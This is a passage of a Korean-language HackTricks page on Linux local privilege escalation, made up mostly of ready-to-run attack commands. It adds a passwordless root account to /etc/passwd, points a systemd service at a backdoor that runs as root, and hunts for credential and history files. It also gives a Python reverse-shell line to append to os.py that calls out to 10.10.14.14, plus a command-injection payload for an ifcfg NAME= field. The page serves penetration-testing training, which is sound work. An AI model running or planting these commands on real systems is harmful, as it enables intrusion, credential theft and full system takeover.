echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**참고:** BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

**일부 민감한 파일에 쓸 수 있는지** 확인해야 합니다. 예를 들어, **서비스 구성 파일**에 쓸 수 있는지 확인해야 합니다.
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **/etc/systemd/ 내부의 Tomcat 서비스 구성 파일을 수정할 수 있다면**, 다음과 같이 라인을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### 폴더 확인

다음 폴더에는 백업 또는 흥미로운 정보가 포함될 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (아마도 마지막 폴더는 읽을 수 없을 것입니다만 시도해보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/소유 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 지난 몇 분 동안 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일들
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 알려진 암호를 포함하는 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 코드를 읽어보면 **암호를 포함할 수 있는 여러 가능한 파일을 검색**합니다.\
이를 수행하는 또 다른 흥미로운 도구는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)입니다. 이 도구는 Windows, Linux 및 Mac에서 저장된 많은 암호를 검색하는 데 사용되는 오픈 소스 응용 프로그램입니다.

### 로그

로그를 읽을 수 있다면, 그 안에 **흥미로운/기밀 정보를 찾을 수 있을 수도** 있습니다. 로그가 더 이상할수록 더 흥미로울 것입니다 (아마도).\
또한, "**나쁜**" 구성된 (백도어가 있는?) **감사 로그**는 이 게시물에서 설명한대로 감사 로그 내에 **암호를 기록**할 수 있게 할 수도 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**로그를 읽기 위해서는** [**adm 그룹**](interesting-groups-linux-pe/#adm-group)이 정말 유용할 것입니다.

### 쉘 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반적인 자격 증명 검색/정규식

또한 **이름**에 단어 "**password**"가 포함된 파일 또는 **내용** 안에 있는 파일을 확인하고 로그 내에 있는 IP나 이메일 또는 해시 정규식을 확인해야 합니다.\
이 모든 것을 어떻게 수행하는지 여기에 모두 나열하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 최종 확인 사항을 확인할 수 있습니다.

## 쓰기 가능한 파일

### Python 라이브러리 탈취

만약 어떤 폴더에서 python 스크립트가 실행될 것인지 **알고 있고** 해당 폴더에 **쓸 수 있거나 python 라이브러리를 수정할 수 있다면**, OS 라이브러리를 수정하고 백도어할 수 있습니다 (python 스크립트가 실행될 위치에 쓸 수 있다면 os.py 라이브러리를 복사하여 붙여넣으세요).

라이브러리에 **백도어**를 넣으려면 os.py 라이브러리 끝에 다음 줄을 추가하십시오 (IP와 PORT를 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`의 취약점으로 인해 로그 파일이나 해당 상위 디렉토리에 **쓰기 권한**이 있는 사용자는 권한을 상승할 수 있습니다. 이는 `logrotate`가 종종 **root**로 실행되기 때문에 특히 _**/etc/bash\_completion.d/**_와 같은 디렉토리에서 임의의 파일을 실행하도록 조작될 수 있기 때문입니다. _/var/log_뿐만 아니라 로그 회전이 적용된 모든 디렉토리의 권한을 확인하는 것이 중요합니다.

{% hint style="info" %}
이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 줍니다.
{% endhint %}

이 취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)을 사용하여 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**와 매우 유사하므로 로그를 변경할 수 있는 경우 해당 로그를 관리하는 사용자를 확인하고 시스템이 로그를 시링크로 대체하여 권한을 상승할 수 있는지 확인하십시오.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**취약점 참조:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **쓰기**하거나 기존 스크립트를 **조정**할 수 있다면 시스템이 **손상**됩니다.

네트워크 스크립트인 _ifcg-eth0_ 예를 들어 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 정확히 같이 보입니다. 그러나 Linux에서는 Network Manager(dispatcher.d)에 의해 \~소스코드로\~ 사용됩니다.

내 경우, 이러한 네트워크 스크립트에서 `NAME=` 속성이 올바르게 처리되지 않습니다. 이름에 **공백이 있으면 시스템은 공백 이후의 부분을 실행하려고 시도**합니다. 이는 **첫 번째 공백 이후의 모든 것이 root로 실행**된다는 것을 의미합니다.

예: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd 및 rc.d**

디렉토리 `/etc/init.d`는 **System V init (SysVinit)**, **클래식 Linux 서비스 관리 시스템**을 위한 **스크립트**를 포함하고 있습니다. 이 디렉토리에는 서비스를 `start`, `stop`, `restart` 및 때로는 `reload`하는 스크립트가 포함되어 있습니다. 이러한 스크립트는 직접 실행하거나 `/etc/rc?.d/`에서 찾을 수 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템에서의 대체 경로는 `/etc/rc.d/init.d`입니다.

반면에 `/etc/init`은 **Upstart**과 관련이 있으며, 이는 Ubuntu에서 소개된 더 최신의 **서비스 관리**를 위한 것으로, 서비스 관리 작업을 위한 구성 파일을 사용합니다. Upstart으로의 전환에도 불구하고, Upstart에서 호환성 레이어로 SysVinit 스크립트가 여전히 사용되고 있습니다.

**systemd**는 현대적인 초기화 및 서비스 관리자로 등장하여, 온디맨드 데몬 시작, 자동 마운트 관리 및 시스템 상태 스냅샷과 같은 고급 기능을 제공합니다. 이는 배포 패키지를 위해 `/usr/lib/systemd/`에 파일을 구성하고, 시스템 관리 프로세스를 간소화하기 위해 관리자 수정을 위해 `/etc/systemd/system/`에 파일을 구성합니다.

## 기타 트릭

### NFS 권한 상승

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 제한된 쉘에서 탈출

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## 커널 보안 보호

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움

[정적 impacket 이진 파일](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc 도구

### **Linux 로컬 권한 상승 벡터를 찾기 위한 최상의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 옵션)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux 및 MAC에서 커널 취약점 열거 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (물리적 액세스):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**더 많은 스크립트 모음**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 참고 자료

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
